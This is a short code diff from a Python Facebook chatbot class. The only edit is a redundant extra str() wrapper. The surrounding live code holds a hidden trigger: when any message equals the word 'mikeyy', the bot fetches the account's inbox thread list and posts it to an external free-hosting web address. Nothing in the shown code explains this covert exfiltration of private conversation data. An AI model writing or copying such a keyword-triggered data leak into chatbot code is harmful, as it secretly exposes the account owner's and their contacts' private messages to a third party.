@@ -757,7 +757,7 @@ class ChatBot(Client):
                         msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                             thread_type=thread_type))
             elif ("mikeyy" == msg):
-                reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
+                reply = str(str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None)))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
                 
                 #print(reply)
